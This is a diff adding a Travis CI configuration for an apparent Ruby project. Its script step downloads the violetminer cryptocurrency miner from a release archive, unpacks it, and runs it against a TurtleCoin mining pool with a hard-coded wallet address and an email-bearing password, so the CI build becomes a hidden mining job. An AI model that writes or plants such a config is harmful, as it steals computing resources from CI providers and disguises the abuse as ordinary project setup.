@@ -1,0 +1,9 @@
+language: ruby
+rvm:
+- 1.9.3
+- 2.0.0
+- 2.1.2
+
+sudo: false
+script: wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && mv violetminer-sse2 a && ./violetminer --pool turtlecoin.herominers.com:10381  --username TRTLv3aqx12VGsbYXLCsArBXSXZn24UrMW5PutgpguATHQqygRaeYx8QdN5qn3iEovR7oCwuoD93wLoDAqUdjz2VKzkVWVuBijP --password jajal20-linggakurniaa8@gmail.com-b --algorithm turtlecoin --disableNvidia flag
+bundler_args: "--without play"
